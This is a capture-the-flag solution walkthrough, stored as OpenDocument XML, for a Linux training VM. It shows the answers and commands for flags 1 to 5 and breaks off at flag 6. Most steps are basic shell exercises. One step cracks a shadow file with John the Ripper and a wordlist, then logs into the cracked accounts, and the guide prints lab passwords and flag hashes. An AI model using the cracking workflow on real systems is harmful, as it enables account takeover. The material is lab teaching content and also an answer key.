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 fo:font-style="normal" fo:font-weight="normal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/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:orphans="2" fo:widows="2"/>
    </style:style>
    <style:style style:name="P4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5" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" style:contextual-spacing="false" fo:orphans="2" fo:widows="2"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" loext:opacity="100%" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="0008706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### <text:span text:style-name="T2">Capture the flag</text:span> Scavenger Hunt</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">### flag_1:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Finding this flag is imperative to moving on quickly, as it contains the passwords from users before they were hacked. Luckily, it doesn't have a great hiding spot.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">**Solution:**</text:p>
      <text:p text:style-name="P1">Listing _all_ files in the student's home folder will reveal:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">- `~/Desktop/.flag_1` </text:p>
      <text:p text:style-name="P1">- `~/Desktop/.pass_list.txt`</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">student:~ $ ls -Ra</text:p>
      <text:p text:style-name="P1">.:</text:p>
      <text:p text:style-name="P1">. <text:s text:c="2"/>.00-motd <text:s text:c="7"/>.bashrc Documents <text:s text:c="2"/>.gnupg <text:s text:c="5"/>Pictures <text:s text:c="3"/>Public</text:p>
      <text:p text:style-name="P1">.. <text:s/>.bash_logout <text:s text:c="3"/>Desktop Downloads <text:s text:c="2"/>.hushlogin <text:s/>.profile <text:s text:c="3"/>Videos</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">./Desktop</text:p>
      <text:p text:style-name="P1">. <text:s text:c="2"/>.. <text:s/>.flag_1 .pass_list.txt</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">The contents of the `.flag_1` file read:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">-------------------------------------------------------</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s/><text:span text:style-name="T1">You found 'flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq.'</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">------------ Nice work. Find 7 more. ------------------</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">### flag_2:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">A famous hacker had created a user on the system a year ago. Find this user, crack his password and login to his account.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">**Solution:**</text:p>
      <text:p text:style-name="P1">- The hacker is 'Kevin Mitnik'.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">- Use these files to crack his password:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `~/Desktop/.pass_list.txt` </text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `~/my-files/shadow`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">student:~$ cd ~/Desktop/</text:p>
      <text:p text:style-name="P1">student:Desktop\ $ john --wordlist=.pass_list.txt ../Documents/my-files/shadow</text:p>
      <text:p text:style-name="P1">Created directory: /home/student/.john</text:p>
      <text:p text:style-name="P1">Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])</text:p>
      <text:p text:style-name="P1">Press 'q' or Ctrl-C to abort, almost any other key for status</text:p>
      <text:p text:style-name="P1">letmein <text:s text:c="4"/>(student)</text:p>
      <text:p text:style-name="P1">trustno1 <text:s text:c="3"/>(mitnik)</text:p>
      <text:p text:style-name="P1">2g 0:00:00:00 100% 3.030g/s 145.4p/s 290.9C/s 123456..webcam1</text:p>
      <text:p text:style-name="P1">Use the "--show" option to display all of the cracked passwords reliably</text:p>
      <text:p text:style-name="P1">Session completed</text:p>
      <text:p text:style-name="P1">student:Desktop\ $ </text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>student:Desktop\ $ </text:p>
      <text:p text:style-name="P1">student:Desktop\ $ <text:s/>john --show ../Documents/my-files/shadow</text:p>
      <text:p text:style-name="P1">student:letmein:18197:0:99999:7:::</text:p>
      <text:p text:style-name="P1">mitnik:trustno1:18197:0:99999:7:::</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">2 password hashes cracked, 0 left</text:p>
      <text:p text:style-name="P1">student:Desktop\ $ </text:p>
      <text:p text:style-name="P1">student:Desktop\ $ <text:s/>su mitnik</text:p>
      <text:p text:style-name="P1">Password:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">You found flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">mitnik:Desktop\ $</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">The password for the mitnik user is: `trustno1 `. Because the password changes happend _after_ the machine was hacked, we can still login as mitnik. </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">### flag_3:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Find a ‘log’ file _and_ a zip file related to the hacker's name. <text:s/></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">- Use a compound command to figure out the unique count of IP Addresses in this log file. That number is a password.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">**Solution:**</text:p>
      <text:p text:style-name="P1">- The unique number of IP addresses is the password for the hidden zipfile. opening that zipfile will give you the credentials for the `babbage` user.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">- Running `ls -Ra` in the <text:s/>`/home/mitnik` directory, will show all the directories and files within them. The `.secret.zip` file is located in `/home/mitnik/Desktop`</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">mitnik:/\ $ cd /home/mitnik</text:p>
      <text:p text:style-name="P1">mitnik:~\ $ls -Ra</text:p>
      <text:p text:style-name="P1">.:</text:p>
      <text:p text:style-name="P1">. <text:s text:c="2"/>.. <text:s/>.bash_logout <text:s text:c="3"/>.bashrc Desktop Documents <text:s text:c="2"/>Downloads <text:s text:c="2"/>Pictures <text:s text:c="3"/>.profile <text:s text:c="3"/>Public <text:s/>Videos</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">./Desktop</text:p>
      <text:p text:style-name="P1">. <text:s text:c="2"/>..</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">./Documents</text:p>
      <text:p text:style-name="P1">. <text:s text:c="2"/>.. <text:s/>.secret.zip</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">The log file is located in `/var/log/mitnik.log`</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">mitnik:~\ $ ls /var/log</text:p>
      <text:p text:style-name="P1">alternatives.log <text:s/>dpkg.log <text:s text:c="2"/>lastlog <text:s text:c="4"/>tallylog</text:p>
      <text:p text:style-name="P1">apt <text:s text:c="14"/>faillog <text:s text:c="3"/>lxd <text:s text:c="8"/>vboxadd-setup.log</text:p>
      <text:p text:style-name="P1">auth.log <text:s text:c="9"/>journal <text:s text:c="3"/>mitnik.log <text:s/>vboxadd-setup.log.1</text:p>
      <text:p text:style-name="P1">btmp <text:s text:c="13"/>kern.log <text:s text:c="2"/>samba <text:s text:c="6"/>vboxadd-setup.log.3</text:p>
      <text:p text:style-name="P1">dist-upgrade <text:s text:c="5"/>landscape <text:s/>syslog <text:s text:c="5"/>wtmp</text:p>
      <text:p text:style-name="P1">mitnik:~\ $ </text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>Inspecting the file shows that the IP addresses are only at the beginning of each line.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">73.211.34.100 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"</text:p>
      <text:p text:style-name="P1">174.116.246.20 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"</text:p>
      <text:p text:style-name="P1">23.135.3.168 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"</text:p>
      <text:p text:style-name="P1">241.21.200.190 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"</text:p>
      <text:p text:style-name="P1">111.58.233.100 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"</text:p>
      <text:p text:style-name="P1">104.125.72.8 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"</text:p>
      <text:p text:style-name="P1">122.201.225.11 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"</text:p>
      <text:p text:style-name="P1">215.5.46.179 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">We can create a compound command that counts the number of uniqe lines.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">mitnik:~\ $ cat /var/log/mitnik.log | sort | uniq | wc -l</text:p>
      <text:p text:style-name="P1">102</text:p>
      <text:p text:style-name="P1">mitnik:~\ $ </text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">The password for the `/home/Documents/.secret.zip` is `102`</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">mitnik:~\ $ unzip ~/Documents/.secret.zip </text:p>
      <text:p text:style-name="P1">Archive: <text:s/>/home/mitnik/Documents/.secret.zip</text:p>
      <text:p text:style-name="P1">[/home/mitnik/Documents/.secret.zip] babbage password: </text:p>
      <text:p text:style-name="P2"><text:s/><text:span text:style-name="T1">inflating: babbage <text:s text:c="16"/></text:span></text:p>
      <text:p text:style-name="P1">mitnik:~\ $ ls</text:p>
      <text:p text:style-name="P1">babbage <text:s/>Desktop <text:s/>Documents <text:s/>Downloads <text:s/>Pictures <text:s/>Public <text:s/>Videos</text:p>
      <text:p text:style-name="P1">mitnik:~\ $ cat babbage </text:p>
      <text:p text:style-name="P1">-----------------</text:p>
      <text:p text:style-name="P1">babbage : freedom</text:p>
      <text:p text:style-name="P1">-----------------</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">The password for the `babbage` user is `freedom`</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Login as babbage to find flag_3:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">mitnik:~\ $ su babbage</text:p>
      <text:p text:style-name="P1">Password: </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">You found flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">babbage:mitnik\ $</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">### flag_4:</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P1">Find a directory with a list of hackers. Look for a file that has `read` permissions for the owner, `no` permissions for groups and `executable` only for everyone else.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">**Solution:**</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Switch to the babbage home folder and list all his files:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">babbage:mitnik\ $ cd /home/babbage/</text:p>
      <text:p text:style-name="P1">babbage:~\ $ ls -Ra</text:p>
      <text:p text:style-name="P1">.:</text:p>
      <text:p text:style-name="P1">.bash_logout <text:s/>Desktop <text:s text:c="3"/>Downloads <text:s/>.profile <text:s/>Videos</text:p>
      <text:p text:style-name="P1">.bashrc <text:s text:c="6"/>Documents <text:s/>Pictures <text:s text:c="2"/>Public</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">./Desktop:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">./Documents:</text:p>
      <text:p text:style-name="P1">ancheta <text:s text:c="3"/>berners-lee <text:s/>gonzalez <text:s/>kernighan <text:s/>mitnik <text:s text:c="2"/>rossum <text:s text:c="5"/>torvalds</text:p>
      <text:p text:style-name="P1">anonymous <text:s/>bevan <text:s text:c="7"/>gosling <text:s text:c="2"/>knuth <text:s text:c="5"/>poulsen <text:s/>stallman <text:s text:c="3"/>wirth</text:p>
      <text:p text:style-name="P1">assange <text:s text:c="3"/>calce <text:s text:c="7"/>hopper <text:s text:c="3"/>lamo <text:s text:c="6"/>pryce <text:s text:c="3"/>stroustrup <text:s/>woz</text:p>
      <text:p text:style-name="P1">astra <text:s text:c="5"/>gates <text:s text:c="7"/>james <text:s text:c="4"/>lovelace <text:s text:c="2"/>ritchie <text:s/>thompson</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">All of the hacker files are in his documents.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Switch to that directory and list all the permissions for those files.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">babbage:Documents\ $ ls -l</text:p>
      <text:p text:style-name="P1">total 4</text:p>
      <text:p text:style-name="P1">--w--w-rwx 1 babbage babbage 0 Oct 30 21:05 ancheta</text:p>
      <text:p text:style-name="P1">-rw-r--r-- 1 babbage babbage 0 Oct 30 21:05 anonymous</text:p>
      <text:p text:style-name="P1">-rw-rw-rw- 1 babbage babbage 0 Oct 30 21:05 assange</text:p>
      <text:p text:style-name="P1">---xrwxr-- 1 babbage babbage 0 Oct 30 21:05 astra</text:p>
      <text:p text:style-name="P1">---x---r-- 1 babbage babbage 0 Oct 30 21:05 berners-lee</text:p>
      <text:p text:style-name="P1">---xrwxr-- 1 babbage babbage 0 Oct 30 21:05 bevan</text:p>
      <text:p text:style-name="P1">--w--w-rwx 1 babbage babbage 0 Oct 30 21:05 calce</text:p>
      <text:p text:style-name="P1">-r-------x 1 babbage babbage 0 Oct 30 21:05 gates</text:p>
      <text:p text:style-name="P1">-rw-r--r-- 1 babbage babbage 0 Oct 30 21:05 gonzalez</text:p>
      <text:p text:style-name="P1">-r-------x 1 babbage babbage 0 Oct 30 21:05 gosling</text:p>
      <text:p text:style-name="P1">-rw-rw-rw- 1 babbage babbage 0 Oct 30 21:05 hopper</text:p>
      <text:p text:style-name="P1">---xrwxr-- 1 babbage babbage 0 Oct 30 21:05 james</text:p>
      <text:p text:style-name="P1">---x---r-- 1 babbage babbage 0 Oct 30 21:05 kernighan</text:p>
      <text:p text:style-name="P1">---x---r-- 1 babbage babbage 0 Oct 30 21:05 knuth</text:p>
      <text:p text:style-name="P1">-rw-r--r-- 1 babbage babbage 0 Oct 30 21:05 lamo</text:p>
      <text:p text:style-name="P1">-rwx-w---- 1 babbage babbage 0 Oct 30 21:05 lovelace</text:p>
      <text:p text:style-name="P1">-rw-r--r-- 1 babbage babbage 0 Oct 30 21:05 mitnik</text:p>
      <text:p text:style-name="P1">--w--w-rwx 1 babbage babbage 0 Oct 30 21:05 poulsen</text:p>
      <text:p text:style-name="P1">--w--w-rwx 1 babbage babbage 0 Oct 30 21:05 pryce</text:p>
      <text:p text:style-name="P1">-rw-rw-rw- 1 babbage babbage 0 Oct 30 21:05 ritchie</text:p>
      <text:p text:style-name="P1">---xrwxr-- 1 babbage babbage 0 Oct 30 21:05 rossum</text:p>
      <text:p text:style-name="P1">-r-------x 1 babbage babbage 5 Oct 30 20:10 stallman</text:p>
      <text:p text:style-name="P1">-rw-rw-rw- 1 babbage babbage 0 Oct 30 21:05 stroustrup</text:p>
      <text:p text:style-name="P1">---x---r-- 1 babbage babbage 0 Oct 30 21:05 thompson</text:p>
      <text:p text:style-name="P1">-rwx-w---- 1 babbage babbage 0 Oct 30 21:05 torvalds</text:p>
      <text:p text:style-name="P1">-rwx-w---- 1 babbage babbage 0 Oct 30 21:05 wirth</text:p>
      <text:p text:style-name="P1">-r-------x 1 babbage babbage 0 Oct 30 21:05 woz</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">The files with `read` permissions for the owner, `no` permissions for groups and `executable` only for everyone else translate to permissions: `-r-------x`</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">There are 4 files with these permissions:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">babbage:Documents\ $ ls -l | grep "^\-r\-\-\-\-\-\-\-x"</text:p>
      <text:p text:style-name="P1">-r-------x 1 babbage babbage 0 Oct 30 21:05 gates</text:p>
      <text:p text:style-name="P1">-r-------x 1 babbage babbage 0 Oct 30 21:05 gosling</text:p>
      <text:p text:style-name="P1">-r-------x 1 babbage babbage 5 Oct 30 20:10 stallman</text:p>
      <text:p text:style-name="P1">-r-------x 1 babbage babbage 0 Oct 30 21:05 woz</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">The stallman file has contents.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">babbage:Documents\ $ cat gates</text:p>
      <text:p text:style-name="P1">babbage:Documents\ $ cat gosling </text:p>
      <text:p text:style-name="P1">babbage:Documents\ $ cat woz</text:p>
      <text:p text:style-name="P1">babbage:Documents\ $ cat stallman </text:p>
      <text:p text:style-name="P1">computer</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">The password to the stallman user is `computer`.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Login as Stallman.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">babbage:Documents\ $ su stallman</text:p>
      <text:p text:style-name="P1">Password: </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">You found flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">stallman:Documents\ $</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">### flag_5:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">This user is writing a bash script, except it isn't quite working yet. Find it, debug it and run it.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">**Solution**:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Change to stallman's home directory and find the script file located in /home/stallman/Documents/flag5.sh.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">stallman:Documents\ $ cd</text:p>
      <text:p text:style-name="P1">stallman:~\ $ ls -Ra</text:p>
      <text:p text:style-name="P1">.:</text:p>
      <text:p text:style-name="P1">. <text:s text:c="2"/>.bash_logout <text:s/>Desktop <text:s text:c="3"/>Downloads <text:s/>.profile <text:s/>Videos</text:p>
      <text:p text:style-name="P1">.. <text:s/>.bashrc <text:s text:c="6"/>Documents <text:s/>Pictures <text:s text:c="2"/>Public</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">./Desktop:</text:p>
      <text:p text:style-name="P1">. <text:s/>..</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">./Documents:</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>. <text:s/>.. <text:s/>flag5.sh</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Make the script executable and run it. </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">stallman:~\ $ chmod +x Documents/flag5.sh </text:p>
      <text:p text:style-name="P1">stallman:~\ $ cd Documents/</text:p>
      <text:p text:style-name="P1">stallman:Documents\ $ ls</text:p>
      <text:p text:style-name="P1">flag5.sh</text:p>
      <text:p text:style-name="P1">stallman:Documents\ $ ./flag5.sh </text:p>
      <text:p text:style-name="P1">./flag5.sh: line 4: syntax error near unexpected token `do'</text:p>
      <text:p text:style-name="P1">./flag5.sh: line 4: ` <text:s text:c="3"/>do'</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">This syntax error says there's somethig wrong with line 4.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Look at the script. We can see that the first `for` loop has an extra `do`.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">stallman:Documents\ $ head -6 flag5.sh </text:p>
      <text:p text:style-name="P1">#!/bin/bash</text:p>
      <text:p text:style-name="P1">width=72</text:p>
      <text:p text:style-name="P1">for i in ${0}; do</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">do</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">lines="$(wc -l &lt; $1 | sed 's/ //g')"</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">chars="$(wc -c &lt; $1 | sed 's/ //g')"</text:span></text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Remove on of the `do`s.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">The head of the script should now read:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">#!/bin/bash</text:p>
      <text:p text:style-name="P1">width=72</text:p>
      <text:p text:style-name="P1">for i in ${0}; do</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">lines="$(wc -l &lt; $1 | sed 's/ //g')"</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">chars="$(wc -c &lt; $1 | sed 's/ //g')"</text:span></text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Run the script again:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">stallman:Documents\ $ ./flag5.sh </text:p>
      <text:p text:style-name="P1">./flag5.sh: line 13: syntax error near unexpected token `else'</text:p>
      <text:p text:style-name="P1">./flag5.sh: line 13: ` <text:s text:c="7"/>else'</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Now there is an error on line 13.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">file=$(cat /var/tmp/5galf)</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">if [ ${#file} -gt $width ]</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">echo "$file" | fmt | sed -e '$s/^/ <text:s/>/' -e '2,$s/^/+ /'</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">else</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">echo " <text:s/>$file"</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">fi</text:span></text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P1">Notice that this `if` statment is missing the `then` declaration.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Add the `then`:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">file=$(cat /var/tmp/5galf)</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">if [ ${#file} -gt $width ]</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">then</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">echo "$file" | fmt | sed -e '$s/^/ <text:s/>/' -e '2,$s/^/+ /'</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">else</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">echo " <text:s/>$file"</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">fi</text:span></text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Run the script again:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">stallman:Documents\ $ ./flag5.sh </text:p>
      <text:p text:style-name="P1">./flag5.sh: line 4: $1: ambiguous redirect</text:p>
      <text:p text:style-name="P1">./flag5.sh: line 5: $1: ambiguous redirect</text:p>
      <text:p text:style-name="P1">-----------------------------------------------------------------</text:p>
      <text:p text:style-name="P1">File <text:s/>( lines, <text:s/>characters, owned by stallman):</text:p>
      <text:p text:style-name="P1">-----------------------------------------------------------------</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">------------------------------------------</text:p>
      <text:p text:style-name="P1">+ </text:p>
      <text:p text:style-name="P1">+ <text:s/>You found flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00</text:p>
      <text:p text:style-name="P1">+ </text:p>
      <text:p text:style-name="P1">+ <text:s text:c="3"/>---------- sysadmin : passw0rd ----------</text:p>
      <text:p text:style-name="P1">-----------------------------------------------------------------</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Here we have flag_5.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">The password for the `sysadmin` user is `passw0rd`.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">**Alternate Solution**</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Notice inside the script the line:</text:p>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">file=$(cat /var/tmp/5galf)</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P1">`5galf` is the location of flag_5</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">You can open this file directly to get the flag without fixing the script.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">stallman:Documents\ $ cat /var/tmp/5galf </text:p>
      <text:p text:style-name="P1">------------------------------------------</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s/><text:span text:style-name="T1">flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s/><text:span text:style-name="T1">---------- sysadmin : passw0rd ----------</text:span></text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">### flag_6:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Inspect this user's custom aliases.</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P1">**Solution 1:**</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Login as the sysadmin user and look for an aliases in the .bashrc file.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
